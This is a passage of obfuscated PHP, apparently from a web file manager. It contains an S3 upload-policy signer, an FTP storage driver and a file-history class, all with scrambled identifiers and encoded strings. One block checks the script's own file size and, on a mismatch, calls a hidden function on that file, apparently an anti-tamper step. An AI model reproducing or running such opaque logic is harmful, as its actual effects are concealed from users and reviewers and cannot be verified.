array($ôóóã˜ü[284] => gmdate($ôóóã˜ü[308], strtotime($ôóóã˜ü[286])), $ôóóã˜ü[287] => array(array($ôóóã˜ü[288] => $this->bucket), array($ôóóã˜ü[289] => $êåªÍà”), array($ôóóã˜ü[290], $ôóóã˜ü[291], $ôóóã˜ü[12]), array($ôóóã˜ü[290], $ôóóã˜ü[292], $ôóóã˜ü[12]), array($ôóóã˜ü[290], $ôóóã˜ü[293], $ôóóã˜ü[12]), array($ôóóã˜ü[294] => $¿Ÿ‚ÒÖÈ), array($ôóóã˜ü[295] => $Ÿé—»şš), array($ôóóã˜ü[296] => $ŒˆÁÛ§°), array($ôóóã˜ü[297] => $û‘‘–ç), array($ôóóã˜ü[298] => $•÷õÚ˜ñ))); $î–í‰³² = base64_encode(json_encode($¦œìÒ™)); $ÜˆŞš«½ = hash_hmac($ôóóã˜ü[299], $âÑÛ¼¥, $ôóóã˜ü[300] . $this->secret, !0); $—Ò•Ó½ = hash_hmac($ôóóã˜ü[299], $this->region, $ÜˆŞš«½, !0); $‡·áÕå« = hash_hmac($ôóóã˜ü[299], $§£—”Ö, $—Ò•Ó½, !0); $œ©ı›¸ = hash_hmac($ôóóã˜ü[299], $¸ªÌ¤â­, $‡·áÕå«, !0); $µÛû¨ Ì = hash_hmac($ôóóã˜ü[299], $î–í‰³², $œ©ı›¸); $«ıñ‰Æ– = array($ôóóã˜ü[256] => $ôóóã˜ü[12], $ôóóã˜ü[301] => $ôóóã˜ü[12], $ôóóã˜ü[289] => $êåªÍà”, $ôóóã˜ü[294] => $¿Ÿ‚ÒÖÈ, $ôóóã˜ü[302] => $î–í‰³², $ôóóã˜ü[303] => $Ÿé—»şš, $ôóóã˜ü[304] => $ŒˆÁÛ§°, $ôóóã˜ü[305] => $û‘‘–ç, $ôóóã˜ü[306] => $•÷õÚ˜ñ, $ôóóã˜ü[307] => $µÛû¨ Ì, $ôóóã˜ü[218] => $this->getHost()); return $«ıñ‰Æ–; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ü³ù£¹£) { parent::__construct(); if (count($ü³ù£¹£) > 0) { $this->_init($ü³ù£¹£); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¶®•Ú¼·) { $æ—Æ‚ô‹ =& $_SERVER[÷ôÚîå]; global $config; $this->appCharset = $config[$æ—Æ‚ô‹[1447]]; $this->systemCharset = $config[$æ—Æ‚ô‹[1448]]; if (isset($¶®•Ú¼·[$æ—Æ‚ô‹[1449]]) && $¶®•Ú¼·[$æ—Æ‚ô‹[1449]]) { $this->systemCharset = $¶®•Ú¼·[$æ—Æ‚ô‹[1449]]; } } public function iconvApp($°ƒ¼™İ) { return $this->iconvTo($°ƒ¼™İ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ ¬“ö „) { return $this->iconvTo($ ¬“ö „, $this->appCharset, $this->systemCharset); } public function getPathOuter($ºË¤‹†ğ) { $±Ÿ¾Éõê =& $_SERVER[÷ôÚîå]; $»üÒîµû = $this->iconvApp($this->pathBase); $ºË¤‹†ğ = $this->iconvApp($ºË¤‹†ğ); if (substr($»üÒîµû, 0, 2) == $±Ÿ¾Éõê[1421]) { $»üÒîµû = BASIC_PATH . substr($»üÒîµû, 2); } if (substr($ºË¤‹†ğ, 0, 2) == $±Ÿ¾Éõê[1421]) { $ºË¤‹†ğ = BASIC_PATH . substr($ºË¤‹†ğ, 2); } $»üÒîµû = KodIO::clear($»üÒîµû); $ºË¤‹†ğ = KodIO::clear($ºË¤‹†ğ); $ºË¤‹†ğ = substr($ºË¤‹†ğ, strlen($»üÒîµû)); if (empty($this->pathDriver)) { return $ºË¤‹†ğ; } return $this->pathDriver . $±Ÿ¾Éõê[8] . ltrim($ºË¤‹†ğ, $±Ÿ¾Éõê[8]); } private function _init($Ïõ×šÂÃ = array()) { $„† Ãšë =& $_SERVER[÷ôÚîå]; if (!function_exists($„† Ãšë[1450])) { throw new Exception(LNG($„† Ãšë[1451])); } $this->config = $Ïõ×šÂÃ; $this->charsetReset($Ïõ×šÂÃ); foreach ($Ïõ×šÂÃ as $ôƒëŸÏŸ => $îãï´ó©) { if (isset($this->{$ôƒëŸÏŸ})) { $this->{$ôƒëŸÏŸ} = $îãï´ó©; } } return $this->_login($Ïõ×šÂÃ); } private function _login($ß¹»êŞÓ) { $Æú õäÇ =& $_SERVER[÷ôÚîå]; static $§Äª³‰¥ = array(); $‡ªüÁŒ = md5(json_encode($ß¹»êŞÓ)); if (isset($§Äª³‰¥[$‡ªüÁŒ])) { foreach ($§Äª³‰¥[$‡ªüÁŒ] as $Æêøš­£ => $¼¯ßºşƒ) { $this->{$Æêøš­£} = $¼¯ßºşƒ; } return !0; } $Ú–ÕÏƒù = parse_url(trim($this->server, $Æú õäÇ[8])); $this->host = $Ú–ÕÏƒù[$Æú õäÇ[218]]; $»åÙû°Ê = isset($Ú–ÕÏƒù[$Æú õäÇ[217]]) && $Ú–ÕÏƒù[$Æú õäÇ[217]] == $Æú õäÇ[1452] ? !0 : !1; $this->scheme = $»åÙû°Ê ? $Æú õäÇ[1453] : $Æú õäÇ[1454]; $this->port = isset($Ú–ÕÏƒù[$Æú õäÇ[219]]) ? $Ú–ÕÏƒù[$Æú õäÇ[219]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Æú õäÇ[1455]) . $this->host . $Æú õäÇ[4] . $this->port, !0); return !1; } $èü•ô±Ú = @ftp_login($this->connect, $this->username, $this->userpass); if (!$èü•ô±Ú) { $this->writeLog(LNG($Æú õäÇ[1456]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $›„ø–­§ = $this->pasv == $Æú õäÇ[101] ? !0 : !1; @ftp_pasv($this->connect, $›„ø–­§); $§Äª³‰¥[$‡ªüÁŒ] = array($Æú õäÇ[1457] => $this->connect, $Æú õäÇ[218] => $this->host, $Æú õäÇ[217] => $this->scheme, $Æú õäÇ[219] => $this->port); return $èü•ô±Ú; } private function _isconn($æ¡ÓÒš = true) { if (is_resource($this->connect)) { return !0; } if (!$æ¡ÓÒš) { return !1; } return $this->_login($this->config); } public function mkfile($á†×†­¹, $‡ïšÈï¤ = '', $È¢·‘âÙ = REPEAT_RENAME) { if ($this->setContent($á†×†­¹, $‡ïšÈï¤)) { return $this->getPathOuter($á†×†­¹); } $this->writeLog(LNG($_SERVER[÷ôÚîå][1458]), !0); return !1; } public function mkdir($²É¼ÊÙÀ, $ôèÑÚ§ø = REPEAT_SKIP) { $Ÿ÷­”©¡ =& $_SERVER[÷ôÚîå]; if (!$²É¼ÊÙÀ || $²É¼ÊÙÀ == $Ÿ÷­”©¡[8]) { return !0; } if (!$this->_isconn()) { return !1; } $²É¼ÊÙÀ = $this->iconvSystem($²É¼ÊÙÀ); if ($this->_isFolder($²É¼ÊÙÀ) || @ftp_mkdir($this->connect, $²É¼ÊÙÀ)) { return $this->getPathOuter($²É¼ÊÙÀ); } if (!$this->mkdir($this->pathFather($²É¼ÊÙÀ))) { return !1; } if ($²É¼ÊÙÀ = @ftp_mkdir($this->connect, $²É¼ÊÙÀ)) { return $this->getPathOuter($²É¼ÊÙÀ); } $this->writeLog(__FUNCTION__ . $Ÿ÷­”©¡[1459], !0); return !1; } public function copyFile($§º©øŞ, $µßˆî–À) { if (!$this->_isconn()) { return !1; } $ÓşËÖî = $this->pathThis($this->iconvSystem($§º©øŞ)); $ªË¿£û¤ = $this->tempFile($ÓşËÖî); $§ê¤„Ï = $this->iconvApp($ªË¿£û¤); $this->download($§º©øŞ, $§ê¤„Ï); $é™îß’¬ = $this->upload($µßˆî–À, $§ê¤„Ï); $this->tempFileRemve($ªË¿£û¤); return $é™îß’¬; } public function moveFile($ö÷£Äºò, $¨Şˆõë) { if (!$this->_isconn()) { return !1; } $ö÷£Äºò = $this->iconvSystem($ö÷£Äºò); $¨Şˆõë = $this->iconvSystem($¨Şˆõë); $Šó‚ºë = @ftp_rename($this->connect, $ö÷£Äºò, $¨Şˆõë); if (!$Šó‚ºë) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } return $this->getPathOuter($¨Şˆõë); } public function delFile($˜ßÁÆÓ˜) { if (!$this->_isconn()) { return !1; } $˜ßÁÆÓ˜ = $this->iconvSystem($˜ßÁÆÓ˜); $ˆüÕÜ£© = @ftp_delete($this->connect, $˜ßÁÆÓ˜); if (!$ˆüÕÜ£©) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); } return $ˆüÕÜ£©; } public function delFolder($¾÷æµÏƒ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $·óª‹ = $å¼£”ğ = array(); $this->fileList($¾÷æµÏƒ, $·óª‹, $å¼£”ğ, !0); $this->listItemCache = !0; foreach ($å¼£”ğ as $ŠÅöˆ•) { $Ó«ÍÚàş = $this->iconvSystem($ŠÅöˆ•[$_SERVER[÷ôÚîå][32]]); $‡·ëÌİæ = @ftp_delete($this->connect, $Ó«ÍÚàş); if (!$‡·ëÌİæ) { return !1; } } foreach ($·óª‹ as $Ó«ÍÚàş) { $Ó«ÍÚàş = $this->iconvSystem($Ó«ÍÚàş); $‡·ëÌİæ = @ftp_rmdir($this->connect, $Ó«ÍÚàş); if (!$‡·ëÌİæ) { return !1; } } $¾÷æµÏƒ = $this->iconvSystem($¾÷æµÏƒ); return @ftp_rmdir($this->connect, $¾÷æµÏƒ); } public function rename($ŒÛöŠ, $Û’Úù±) { $Ş©›À˜Ô =& $_SERVER[÷ôÚîå]; if (!$this->_isconn()) { return !1; } $Öî¦ñ·Ï = $this->fileNameAuto($this->pathFather($ŒÛöŠ), $Û’Úù±); $Öî¦ñ·Ï = $this->iconvSystem($Öî¦ñ·Ï); $ŒÛöŠ = $this->iconvSystem($ŒÛöŠ); $Éõ‘ñ¿ = $this->pathFather($ŒÛöŠ); $÷¯˜ˆÇ = rtrim($Éõ‘ñ¿, $Ş©›À˜Ô[8]) . $Ş©›À˜Ô[8] . $Öî¦ñ·Ï; $¾³©ä¶× = @ftp_rename($this->connect, $ŒÛöŠ, $÷¯˜ˆÇ); if (!$¾³©ä¶×) { $this->writeLog(__FUNCTION__ . $Ş©›À˜Ô[1459], !0); return !1; } $÷¯˜ˆÇ = $this->iconvApp($÷¯˜ˆÇ); return $this->getPathOuter($÷¯˜ˆÇ); } private function folderInfo($ÀáÔŒ·, $¬Á‘Øå× = false) { $£îâïŠş =& $_SERVER[÷ôÚîå]; $İñÏé = array($£îâïŠş[32] => $this->pathThis($ÀáÔŒ·), $£îâïŠş[97] => $this->getPathOuter($£îâïŠş[8] . $ÀáÔŒ·), $£îâïŠş[33] => $£îâïŠş[88]); if ($¬Á‘Øå×) { return $İñÏé; } $İñÏé[$£îâïŠş[241]] = $İñÏé[$£îâïŠş[98]] = 0; $İñÏé[$£îâïŠş[242]] = $İñÏé[$£îâïŠş[243]] = !0; return $İñÏé; } private function fileInfo($ç§çÚ“¿, $¸‰£ƒÏ = false, $ï«±¡« = array()) { $÷œµı‚¤ =& $_SERVER[÷ôÚîå]; $œØœÈ¤ = array($÷œµı‚¤[32] => $this->pathThis($ç§çÚ“¿), $÷œµı‚¤[97] => $this->getPathOuter($÷œµı‚¤[8] . $ç§çÚ“¿), $÷œµı‚¤[33] => $÷œµı‚¤[240], $÷œµı‚¤[89] => isset($ï«±¡«[$÷œµı‚¤[89]]) ? $ï«±¡«[$÷œµı‚¤[89]] : 0, $÷œµı‚¤[179] => $this->ext($ç§çÚ“¿)); if ($¸‰£ƒÏ) { return $œØœÈ¤; } $œØœÈ¤[$÷œµı‚¤[241]] = $œØœÈ¤[$÷œµı‚¤[98]] = 0; $œØœÈ¤[$÷œµı‚¤[242]] = $œØœÈ¤[$÷œµı‚¤[243]] = !0; $è£”¨¦ú = $this->iconvSystem($ç§çÚ“¿); $œØœÈ¤[$÷œµı‚¤[98]] = @ftp_mdtm($this->connect, $è£”¨¦ú); if (empty($ï«±¡«)) { $ï«±¡« = $this->objectMeta($ç§çÚ“¿); if (!$ï«±¡«) { return $œØœÈ¤; } } $œØœÈ¤[$÷œµı‚¤[89]] = $ï«±¡«[$÷œµı‚¤[89]]; return $œØœÈ¤; } public function size($Û£Â¬”²) { $¤×ªÀ÷ì = $this->objectMeta($Û£Â¬”²); return $¤×ªÀ÷ì ? $¤×ªÀ÷ì[$_SERVER[÷ôÚîå][89]] : 0; } public function info($¶ºìÅœƒ) { if ($this->isFile($¶ºìÅœƒ)) { return $this->fileInfo($¶ºìÅœƒ, 0); } else { if ($this->isFolder($¶ºìÅœƒ)) { return $this->folderInfo($¶ºìÅœƒ); } } return !1; } private function fileList($í”â¤•¥, &$šµÛğ, &$¤¢ì Óä, $®ª©Ê÷ê = false) { $ŞğæÓ × =& $_SERVER[÷ôÚîå]; $í”â¤•¥ = $this->iconvSystem($í”â¤•¥); if (!$this->isFolder($í”â¤•¥)) { return !1; } @ftp_chdir($this->connect, $ŞğæÓ ×[8]); $í”â¤•¥ = rtrim($í”â¤•¥, $ŞğæÓ ×[8]) . $ŞğæÓ ×[8]; check_abort(); $±ş¿¬è® = @ftp_rawlist($this->connect, $í”â¤•¥); if (!$±ş¿¬è®) { $±ş¿¬è® = array(); } $öÓ¶áƒ£ = array($ŞğæÓ ×[10] => 1, $ŞğæÓ ×[1374] => 1); foreach ($±ş¿¬è® as $ÔôŒ’˜Á) { $­°©¤ÇÉ = $this->_listItem($ÔôŒ’˜Á); if ($­°©¤ÇÉ[0] == $ŞğæÓ ×[847]) { continue; } $ÎúõêÉî = $­°©¤ÇÉ[8]; if (empty($ÎúõêÉî) && $ÎúõêÉî !== $ŞğæÓ ×[238] || isset($öÓ¶áƒ£[$ÎúõêÉî])) { continue; } $ÎúõêÉî = $this->iconvApp($í”â¤•¥ . ltrim($ÎúõêÉî, $ŞğæÓ ×[8])); $ûò›•›Í = array($ŞğæÓ ×[32] => $ÎúõêÉî, $ŞğæÓ ×[33] => $ŞğæÓ ×[240], $ŞğæÓ ×[89] => $­°©¤ÇÉ[4]); if (substr($ÔôŒ’˜Á, 0, 1) == $ŞğæÓ ×[1460]) { $ûò›•›Í[$ŞğæÓ ×[33]] = $ŞğæÓ ×[88]; $ûò›•›Í[$ŞğæÓ ×[89]] = 0; } $öóÁŸğ£ = $ûò›•›Í[$ŞğæÓ ×[33]] == $ŞğæÓ ×[88] ? !0 : !1; $this->cacheMethodInfoSet($ÎúõêÉî, $öóÁŸğ£, $ûò›•›Í); if ($öóÁŸğ£) { $šµÛğ[] = $ÎúõêÉî; if ($®ª©Ê÷ê) { $this->fileList($ÎúõêÉî, $šµÛğ, $¤¢ì Óä, $®ª©Ê÷ê); } continue; } $¤¢ì Óä[] = $ûò›•›Í; } $this->cacheMethodInfoSet($í”â¤•¥, !0); } private function _listItem($£éşÎà¸) { if (empty($£éşÎà¸)) { return array(); } $Âş×¹¸Œ = preg_split($_SERVER[÷ôÚîå][1461], $£éşÎà¸); if (count($Âş×¹¸Œ) <= 9) { return $Âş×¹¸Œ; } $Âş×¹¸Œ[8] = trim(substr($£éşÎà¸, strpos($£éşÎà¸, $Âş×¹¸Œ[7]) + strlen($Âş×¹¸Œ[7]))); return array_splice($Âş×¹¸Œ, 0, 9); } public function listPath($Ğ‹˜´õÚ, $ÊŞ¡ã¨» = false) { $§ÆÛÉİÑ =& $_SERVER[÷ôÚîå]; if (!$this->_isconn()) { return !1; } $Ïáõˆ× = $É³Ç÷¦ = array(); $this->fileList($Ğ‹˜´õÚ, $Ïáõˆ×, $É³Ç÷¦); foreach ($Ïáõˆ× as $ëÃÊ¿ => $¶‘ó·™¯) { $Ïáõˆ×[$ëÃÊ¿] = $this->folderInfo($¶‘ó·™¯, $ÊŞ¡ã¨»); } foreach ($É³Ç÷¦ as $ëÃÊ¿ => $¶‘ó·™¯) { $É³Ç÷¦[$ëÃÊ¿] = $this->fileInfo($¶‘ó·™¯[$§ÆÛÉİÑ[32]], $ÊŞ¡ã¨», $¶‘ó·™¯); } return array($§ÆÛÉİÑ[95] => $Ïáõˆ×, $§ÆÛÉİÑ[96] => $É³Ç÷¦); } public function has($¹ğ¼Ú˜, $Ÿ¤ó’·‘ = false, $å×ÈŸö¥ = true) { $Ü¿²éĞ¶ =& $_SERVER[÷ôÚîå]; $ÂÍ©‚ı¸ = $äÇÂÆ = array(); $ßÆÇåÁÕ = $Ÿ¤ó’·‘ ? !0 : !1; $this->fileList($¹ğ¼Ú˜, $ÂÍ©‚ı¸, $äÇÂÆ, $ßÆÇåÁÕ); if ($Ÿ¤ó’·‘) { return array($Ü¿²éĞ¶[249] => count($äÇÂÆ), $Ü¿²éĞ¶[250] => count($ÂÍ©‚ı¸)); } if ($å×ÈŸö¥) { if (count($äÇÂÆ)) { return !0; } } else { if (count($ÂÍ©‚ı¸)) { return !0; } } return !1; } public function listAll($ìäôÒ€) { $ºÙä‰©¨ =& $_SERVER[÷ôÚîå]; if (!$this->_isconn()) { return !1; } $Ø‰Â…‚ï = $¢åêÓ„÷ = array(); $this->fileList($ìäôÒ€, $Ø‰Â…‚ï, $¢åêÓ„÷, !0); $ ÖâëÕó = array_to_keyvalue($¢åêÓ„÷, $ºÙä‰©¨[32]); foreach ($Ø‰Â…‚ï as $ù‹—ÅŸŒ) { if (is_string($ù‹—ÅŸŒ)) { $ ÖâëÕó[$ù‹—ÅŸŒ] = array($ºÙä‰©¨[89] => 0); } } return $this->listAllFiles($ìäôÒ€, $ ÖâëÕó); } public function getContent($ÖåÅôÆÚ) { if (!$this->_isconn()) { return !1; } $ÖåÅôÆÚ = $this->iconvSystem($ÖåÅôÆÚ); return $this->fileSubstr($ÖåÅôÆÚ); } public function setContent($ù¿¹úé•, $ÄÈ¨ÔŞÖ = '') { if (!$this->_isconn()) { return !1; } $ƒëÁ›ó = $this->pathThis($this->iconvSystem($ù¿¹úé•)); $¿‚ƒ…¾ = $this->tempFile($ƒëÁ›ó); file_put_contents($¿‚ƒ…¾, $ÄÈ¨ÔŞÖ); $ÜÊìÊ°† = $this->upload($ù¿¹úé•, $this->iconvApp($¿‚ƒ…¾)); $this->tempFileRemve($¿‚ƒ…¾); return $ÜÊìÊ°†; } public function fileSubstr($«¤ÅÀ«ú, $àÜÅ€ñü = 0, $Àœù¤Ì˜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($«¤ÅÀ«ú, $àÜÅ€ñü, $Àœù¤Ì˜); } private function ftpRequest($¸±¾é˜¾, $Œ¡èÍò¥ = 0, $ô§Ğ„Êò = false) { $¸±¾é˜¾ = $this->iconvSystem($¸±¾é˜¾); $ËıÀÛ = $this->scheme . $this->host . $_SERVER[÷ôÚîå][4] . $this->port; $¬şÏãÄÀ = curl_init(); curl_setopt($¬şÏãÄÀ, CURLOPT_URL, $ËıÀÛ . $this->pathEncode($¸±¾é˜¾)); curl_setopt($¬şÏãÄÀ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ô§Ğ„Êò) { $ñ¶Ë¡ = $Œ¡èÍò¥ + $ô§Ğ„Êò - 1; curl_setopt($¬şÏãÄÀ, CURLOPT_RANGE, "{$Œ¡èÍò¥}\x2d{$ñ¶Ë¡}"); } curl_setopt($¬şÏãÄÀ, CURLOPT_RETURNTRANSFER, 1); $ééñûñ¤ = curl_exec($¬şÏãÄÀ); curl_close($¬şÏãÄÀ); return $ééñûñ¤; } public function upload($àÁ²€¬ó, $®¦´ŠÏö, $ØÆë³Ôû = false, $¥¦±î = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($àÁ²€¬ó))) { return !1; } $àÁ²€¬ó = $this->iconvSystem($àÁ²€¬ó); $®¦´ŠÏö = $this->iconvSystem($®¦´ŠÏö); $©½ÛŸÛğ = ftp_nb_put($this->connect, $àÁ²€¬ó, $®¦´ŠÏö, FTP_BINARY); while ($©½ÛŸÛğ == FTP_MOREDATA) { $©½ÛŸÛğ = ftp_nb_continue($this->connect); } if ($©½ÛŸÛğ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } return $this->getPathOuter($àÁ²€¬ó); } public function download($ É‚‚§Ò, $—“Ç›“× = '') { if (!$this->_isconn()) { return !1; } $ƒÈÏé“… = $this->pathFather($—“Ç›“×); if (!IO::mkdir($ƒÈÏé“…)) { return !1; } $ É‚‚§Ò = $this->iconvSystem($ É‚‚§Ò); $—“Ç›“× = $this->iconvSystem($—“Ç›“×); $Ìı»ğ’ = ftp_nb_get($this->connect, $—“Ç›“×, $ É‚‚§Ò, FTP_BINARY); while ($Ìı»ğ’ == FTP_MOREDATA) { $Ìı»ğ’ = ftp_nb_continue($this->connect); } if ($Ìı»ğ’ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } return $this->iconvApp($—“Ç›“×); } public function exist($Èïª‹ÖÒ) { return $this->isFile($Èïª‹ÖÒ) || $this->isFolder($Èïª‹ÖÒ); } public function isFile($ìá¥Œ‘¹) { return !$this->isFolder($ìá¥Œ‘¹) && $this->objectMeta($ìá¥Œ‘¹); } public function isFolder($£«ƒ€ïá) { return $this->cacheMethod($_SERVER[÷ôÚîå][189], $£«ƒ€ïá); } protected function objectMeta($ËÔ‚é¶) { return $this->cacheMethod($_SERVER[÷ôÚîå][191], $ËÔ‚é¶); } protected function _objectMeta($¡Õ´ãø) { $£¹‰×ÔĞ =& $_SERVER[÷ôÚîå]; if ($¡Õ´ãø == $£¹‰×ÔĞ[12] || $¡Õ´ãø == $£¹‰×ÔĞ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¡Õ´ãø = $this->iconvSystem($¡Õ´ãø); $òˆ’ÛÔ§ = array($£¹‰×ÔĞ[32] => $this->iconvApp($¡Õ´ãø), $£¹‰×ÔĞ[33] => $£¹‰×ÔĞ[240], $£¹‰×ÔĞ[89] => 0); @ftp_chdir($this->connect, $£¹‰×ÔĞ[8]); $‘è¨­½ = @ftp_size($this->connect, $¡Õ´ãø); if ($‘è¨­½ != -1) { $òˆ’ÛÔ§[$£¹‰×ÔĞ[89]] = $‘è¨­½; } else { $ãÉúòÛŒ = @ftp_chdir($this->connect, $¡Õ´ãø); if (!$ãÉúòÛŒ) { return !1; } $òˆ’ÛÔ§[$£¹‰×ÔĞ[33]] = $£¹‰×ÔĞ[88]; } return $òˆ’ÛÔ§; } protected function _isFolder($ğÉè›¨Ë) { $Õú‰†è³ =& $_SERVER[÷ôÚîå]; if ($ğÉè›¨Ë == $Õú‰†è³[12] || $ğÉè›¨Ë == $Õú‰†è³[8]) { return !0; } $‚Ô«İ– = $this->_objectMeta($ğÉè›¨Ë); return isset($‚Ô«İ–[$Õú‰†è³[33]]) && $‚Ô«İ–[$Õú‰†è³[33]] == $Õú‰†è³[88] ? !0 : !1; } } goto Då•Ä¶Ş; F÷æç¢º°ˆ: define($_SERVER[÷ôÚîå][0], $_SERVER[÷ôÚîå][1]); $_SERVER[’òÌ€º¦] = explode($_SERVER[÷ôÚîå][2], gzinflate(substr($_SERVER[÷ôÚîå][3], 10, -8))); function binCheckEq($ç›²¾, $ÕïÈ½Ïı) { return $ç›²¾ == $ÕïÈ½Ïı; } goto a‚„…ì; f‘°¥Õ„”: $_file = $_SERVER[$_SERVER[÷ôÚîå][69]]; $_size = $_SERVER[÷ôÚîå][887]; if ($_SERVER[$_SERVER[÷ôÚîå][60]] != $_size($_file)) { $_getc = $_SERVER[÷ôÚîå][62]; $_getfile = $_SERVER[$_SERVER[÷ôÚîå][63]] . $_SERVER[÷ôÚîå][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷ôÚîå][65], $_getfilec); if (count($_getarrs) < $_SERVER[÷ôÚîå][66]) { $exit = $_SERVER[÷ôÚîå][67]; $exit(); } $_act = $_SERVER[÷ôÚîå][68]; $_act($_file); } goto A²£‹¼êƒ; FÈ“Šè®óÙ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¦²ğİÀæ =& $_SERVER[÷ôÚîå]; $€şÎ¦’‘ = $GLOBALS[$¦²ğİÀæ[6]][$¦²ğİÀæ[102]]; if ($€şÎ¦’‘[$¦²ğİÀæ[1312]] != 1) { return; } if ($€şÎ¦’‘[$¦²ğİÀæ[1313]] <= 0) { return; } if (isset($_REQUEST[$¦²ğİÀæ[1314]]) && $_REQUEST[$¦²ğİÀæ[1314]] == $¦²ğİÀæ[101]) { return; } Hook::bind($¦²ğİÀæ[1315], $¦²ğİÀæ[1316]); Hook::bind($¦²ğİÀæ[1317], $¦²ğİÀæ[1318]); Hook::bind($¦²ğİÀæ[1319], $¦²ğİÀæ[1320]); Hook::bind($¦²ğİÀæ[1321], $¦²ğİÀæ[1322]); Hook::bind($¦²ğİÀæ[1323], $¦²ğİÀæ[1324]); Hook::bind($¦²ğİÀæ[1325], $¦²ğİÀæ[1326]); } public static function eventBeforeUpload($úùúØŞ¾) { if ($úùúØŞ¾[3] && $úùúØŞ¾[3] != REPEAT_REPLACE) { return; } $¼«·§“ = self::parsePath($úùúØŞ¾[0]); if (!$¼«·§“) { return; } self::add($¼«·§“); } public static function eventBeforeEdit($‘‰Å™ ¢) { $³Ïá¶»¦ = self::parsePath($‘‰Å™ ¢[0]); if (!$³Ïá¶»¦) { return; } self::add($³Ïá¶»¦); } public static function eventBeforeCopyFile($º“ÕÙ›İ, $¼ôÒ§º‚, $¬ø×íúî, $şÒÏ®Û, $®ø‰®¢, $ŒÊæõÓ) { $»¤èĞ¿ù =& $_SERVER[÷ôÚîå]; if (isset($¬ø×íúî->_data[$»¤èĞ¿ù[1247]]) && $¬ø×íúî->_data[$»¤èĞ¿ù[1247]]) { return; } $ôá»Öè¯ = $¬ø×íúî->getPathOuter($şÒÏ®Û); $¨—€Ã¿Æ = self::parsePath($ôá»Öè¯); if (!$¨—€Ã¿Æ) { return; } self::add($¨—€Ã¿Æ); } public static function eventBeforeRename($ Íº¯Üû) { $½¤ŒŞÅ« =& $_SERVER[÷ôÚîå]; $’Ú×¢²¹ = self::parsePath($ Íº¯Üû[0]); if (!$’Ú×¢²¹) { return; } $ğÈ¶¥¤ = self::checkInHistory($’Ú×¢²¹); if (!$ğÈ¶¥¤) { return; } if ($ğÈ¶¥¤[$½¤ŒŞÅ«[33]] == $½¤ŒŞÅ«[240]) { $‰Ş°¶íÂ = self::listData($’Ú×¢²¹); if ($‰Ş°¶íÂ && $‰Ş°¶íÂ[$½¤ŒŞÅ«[454]]) { self::moveHistory($’Ú×¢²¹, $ Íº¯Üû[1]); } } else { IO::rename($ğÈ¶¥¤[$½¤ŒŞÅ«[97]], $ Íº¯Üû[1]); } } public static function eventBeforeMove($ÙºÃÂ) { $ÕÚ“ôÇ· =& $_SERVER[÷ôÚîå]; $ù–„öÇ‹ = self::parsePath($ÙºÃÂ[0]); if (!$ù–„öÇ‹) { return; } $Íü÷·‘† = self::parsePath($ÙºÃÂ[1]); if (!$Íü÷·‘†) { return; } $õ¹Å÷Ï· = $ÙºÃÂ[3]; $ìßÈ£­Ÿ = self::checkInHistory($ù–„öÇ‹); if (!$ìßÈ£­Ÿ) { return; } $î¶¦ìƒ = self::pathHistory($Íü÷·‘†); if ($ìßÈ£­Ÿ[$ÕÚ“ôÇ·[33]] == $ÕÚ“ôÇ·[240]) { $áµğáÎ¨ = self::listData($ù–„öÇ‹); $É²¶”äØ = rtrim($Íü÷·‘†, $ÕÚ“ôÇ·[8]) . $ÕÚ“ôÇ·[8] . ($õ¹Å÷Ï· ? $õ¹Å÷Ï· : get_path_this($ù–„öÇ‹)); $®ÀÂË = self::listData($É²¶”äØ); if ($áµğáÎ¨ && $áµğáÎ¨[$ÕÚ“ôÇ·[454]] && $®ÀÂË && $®ÀÂË[$ÕÚ“ôÇ·[454]]) { return self::clear($ù–„öÇ‹); } if ($áµğáÎ¨ && $áµğáÎ¨[$ÕÚ“ôÇ·[454]]) { self::moveHistory($ù–„öÇ‹, $õ¹Å÷Ï·, $î¶¦ìƒ); } } else { IO::move($ìßÈ£­Ÿ[$ÕÚ“ôÇ·[97]], $î¶¦ìƒ, !1, $õ¹Å÷Ï·); self::clearEmptyFolder(IO::pathFather($ìßÈ£­Ÿ[$ÕÚ“ôÇ·[97]])); } } public static function eventAfterRemove($¤…ºÚ©Ì, $Ñğå­ú¢) { $§±‘©§Á =& $_SERVER[÷ôÚîå]; if (!$Ñğå­ú¢) { return; } $«¶¨ú‚ş = self::parsePath($¤…ºÚ©Ì[0]); if (!$«¶¨ú‚ş) { return; } $ßâ¥ß‚Â = self::checkInHistory($«¶¨ú‚ş); if (!$ßâ¥ß‚Â) { return; } if ($ßâ¥ß‚Â[$§±‘©§Á[33]] == $§±‘©§Á[240]) { $Ú²¸¬¤ = self::listData($«¶¨ú‚ş, !1); if ($Ú²¸¬¤ && $Ú²¸¬¤[$§±‘©§Á[454]]) { self::clear($«¶¨ú‚ş, !1); } } else { IO::remove($ßâ¥ß‚Â[$§±‘©§Á[97]]); self::clearEmptyFolder(IO::pathFather($ßâ¥ß‚Â[$§±‘©§Á[97]])); } } private static function checkInHistory($ÖÁ¢ªï‡) { $ì©ğõ³ = self::pathHistory($ÖÁ¢ªï‡); if (!IO::exist($ì©ğõ³)) { $ì©ğõ³ .= $_SERVER[÷ôÚîå][1327]; } return IO::exist($ì©ğõ³) ? IO::info($ì©ğõ³) : !1; } private static function parsePath($ßÌî€ƒ½) { $€«­Õ¹ =& 